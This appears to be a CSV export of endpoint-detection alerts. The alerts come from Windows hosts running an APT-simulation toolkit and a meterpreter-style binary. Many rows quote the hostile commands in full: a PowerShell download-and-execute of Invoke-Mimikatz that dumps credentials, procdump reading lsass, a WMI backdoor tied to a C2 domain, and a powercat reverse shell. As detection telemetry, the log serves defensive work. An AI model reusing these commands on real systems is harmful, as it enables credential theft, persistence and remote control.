(\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp\Rar$DIb30084.34025),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Sensor-based ML,"A file written to the file system meets the on-sensor machine learning high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume7\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""C:\Users\mdwis\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,explorer.exe,C:\WINDOWS\Explorer.EXE,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume7\Users\mdwis\AppData\Local\Temp\Rar$DIb8172.32537),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,51.195.68.173:443 (TCP),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,0b114fc0f4b6d49f57b3b01dd9ea6a8c
****,Windows 11,High,70,Machine Learning,Cloud-based ML,"A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",WinRAR.exe,\Device\HarddiskVolume3\Program Files\WinRAR\WinRAR.exe,"""C:\Program Files\WinRAR\WinRAR.exe"" ""D:\Users\deshan.fernando\Desktop\f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z""",****,svchost.exe,C:\WINDOWS\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);IconCache.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local);f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR);iconcache_idx.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer);cversions.1.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches);{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000067.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Caches);iconcache_16.db (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Microsoft\Windows\Explorer);rarreg.key (\Device\HarddiskVolume3\Program Files\WinRAR),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622 (\Device\HarddiskVolume4\Users\deshan.fernando\Desktop\CBC),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,80,AI Powered IOA,Malicious File,A process launched that meets the cloud-based behavioral machine learning model  threshold for malicious activity. Detection is based on execution pattern and on-sensor ML telemetry.,mim.exe,\Device\HarddiskVolume3\TMP\mim.exe,"""C:\TMP\mim.exe""  ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,80,Credential Access,OS Credential Dumping,"A PowerShell script appears to be launching mimikatz, a password dumping utility. This is often launched as part of a PowerShell exploit kit. Decode and review the script.",powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  ""iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"" ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,PowerShell,A PowerShell process downloaded and launched a remote file. This is often the result of a malicious macro designed to drop a variety of second stage payloads. Review the command line.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  ""iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"" ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,70,Machine Learning,Cloud-based ML,This file meets the File Analysis ML algorithm's high-confidence threshold for malware.,mim.exe,\Device\HarddiskVolume3\TMP\mim.exe,"""C:\TMP\mim.exe""  ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Cloud-based ML,"A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",7z.exe,\Device\HarddiskVolume4\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\helpers\7z.exe,"""D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\\helpers\7z.exe""  e -paptsimulator ""D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\\enc-toolset.7z"" -aoa -o""C:\TMP"" toolset\mim.exe ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",enc-toolset.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator),mim.exe (\Device\HarddiskVolume3\TMP),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Malware,Malicious File,A process launched with a command line associated with known malware. Investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  -Exec ByPasS "". \""C:\TMP\WMIBackdoor.ps1\"";$Trigger2=New-WMIBackdoorTrigger -TimingInterval 60;$Action2=New-WMIBackdoorAction -C2Uri 'http://googleaccountsservices.com' -Backdoor; $Registration2=Register-WMIBackdoor -Trigger $Trigger2 -Action $Action2""",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,Command and Scripting Interpreter,A script launched that appears to be related to a reverse shell established with a remote system. Review the script and investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,__PSScriptPolicyTest_l3urpkpp.wsj.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,Command and Scripting Interpreter,A suspicious script launched that might be related to malicious activity. A variety of malware families use this technique. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"""C:\Windows\System32\cmd.exe"" ",,__PSScriptPolicyTest_l3urpkpp.wsj.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Credential Access,OS Credential Dumping,"A PowerShell script appears to be launching mimikatz, a password dumping utility. This is often launched as part of a PowerShell exploit kit. Decode and review the script.",powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  ""iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,PowerShell,A PowerShell process downloaded and launched a remote file. This is often the result of a malicious macro designed to drop a variety of second stage payloads. Review the command line.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  ""iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,AI Powered IOA,Malicious File,A process launched that meets the cloud-based behavioral machine learning model  threshold for malicious activity. Detection is based on execution pattern and on-sensor ML telemetry.,mim.exe,\Device\HarddiskVolume3\TMP\mim.exe,"""C:\TMP\mim.exe""  ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Cloud-based ML,This file meets the File Analysis ML algorithm's high-confidence threshold for malware.,mim.exe,\Device\HarddiskVolume3\TMP\mim.exe,"""C:\TMP\mim.exe""  ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,70,Machine Learning,Cloud-based ML,"A file written to the file-system meets the cloud-based machine learning model high confidence threshold for malicious files. Detection is based on a high degree of entropy, packing, anti-malware evasion, or other similarity to known malware.",7z.exe,\Device\HarddiskVolume4\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\helpers\7z.exe,"""D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\\helpers\7z.exe""  e -paptsimulator ""D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\\enc-toolset.7z"" -aoa -o""C:\TMP"" toolset\mim.exe ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,enc-toolset.7z (\Device\HarddiskVolume4\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator),mim.exe (\Device\HarddiskVolume3\TMP),f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,,f8f1c210a8c863efc0f6b8ac3553030a14a702ce8cf573cb5e9cd58f70c7c622,060ca40a61e783e71142bc93c0baf850
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,procdump64.exe,\Device\HarddiskVolume3\Users\Public\procdump64.exe,"""C:\Users\Public\procdump64.exe""  -accepteula -ma lsass.exe ""C:\TMP\somethingwindows.dmp"" ",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,,16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5,a92669ec8852230a10256ac23bbf4489
****,Windows 11,High,80,Malware,Malicious File,A process launched with a command line associated with known malware. Investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe  -Exec ByPasS "". \""C:\TMP\WMIBackdoor.ps1\"";$Trigger2=New-WMIBackdoorTrigger -TimingInterval 60;$Action2=New-WMIBackdoorAction -C2Uri 'http://googleaccountsservices.com' -Backdoor; $Registration2=Register-WMIBackdoor -Trigger $Trigger2 -Action $Action2""",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,,3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8,9d8e30daf21108092d5980c931876b7e
****,Windows 11,High,80,Execution,Command and Scripting Interpreter,A script launched that appears to be related to a reverse shell established with a remote system. Review the script and investigate the process tree.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,__PSScriptPolicyTest_2wkxfqv2.fmu.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 11,Medium,80,Execution,Command and Scripting Interpreter,A suspicious script launched that might be related to malicious activity. A variety of malware families use this technique. Review the script.,powershell.exe,\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell  -Exec Bypass "". \""C:\TMP\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd""",****,cmd.exe,"C:\WINDOWS\system32\cmd.exe /c """"D:\Users\deshan.fernando\Downloads\APTSimulator_pw_apt\APTSimulator\APTSimulator.bat"" """,,__PSScriptPolicyTest_2wkxfqv2.fmu.ps1 (\Device\HarddiskVolume3\Users\deshan.fernando\AppData\Local\Temp),c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,,c55672b5d2963969abe045fe75db52069d0300691d4f1f5923afeadf5353b9d2,9d8e30daf21108092d5980c931876b7e
****,Windows 10,Medium,80,Post-Exploit,Malicious Tool Execution,A suspicious process related to a likely malicious file was launched. Review any binaries involved as they might be related to malware.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Persistence,Registry Run Keys / Startup Folder,A process made a suspicious change to the registry that might indicate a malicious persistence mechanism. Investigate the registry key.,services.exe,\Device\HarddiskVolume3\Windows\System32\services.exe,C:\windows\system32\services.exe,****,wininit.exe,wininit.exe,,,,,1efd9a81b2ddf21b3f327d67a6f8f88f814979e84085ec812af72450310d4281,4eacbe64bb1e7d58e8a26340ed1c7cbd
****,Windows 10,High,80,Privilege Escalation,Bypass User Account Control,A process exhibited unusual behavior that could be associated with a UAC bypass. This may be an attempt to escalate privileges. Investigate the process tree.,cmd.exe,\Device\HarddiskVolume3\Windows\System32\cmd.exe,cmd.exe /c echo eofyzf > \\.\pipe\eofyzf,****,services.exe,C:\windows\system32\services.exe,,,,,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Credential Access,OS Credential Dumping,An unusual process accessed lsass. This might indicate an attempt to dump credentials. Investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,Medium,90,Defense Evasion,Process Injection,A process containing a reflectively loaded DLL opened a handle to LSASS. Adversaries often use this to evade detection. Review the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
****,Windows 10,High,80,Defense Evasion,Process Injection,A process reflectively loaded a DLL associated with the meterpreter exploit kit. Review the DLLs loaded into the process and investigate the process tree.,jasee64.exe,\Device\HarddiskVolume8\jasee64.exe,"""H:\jasee64.exe"" ",****,explorer.exe,C:\windows\Explorer.EXE,,,,192.168.189.130:3333 (TCP),28b45cfa964978f0d7014cfa8e1e2c59fa9191f6806273a8728f7e50133ab8db,23317ba10b75f471af0d72d8fb383f7c
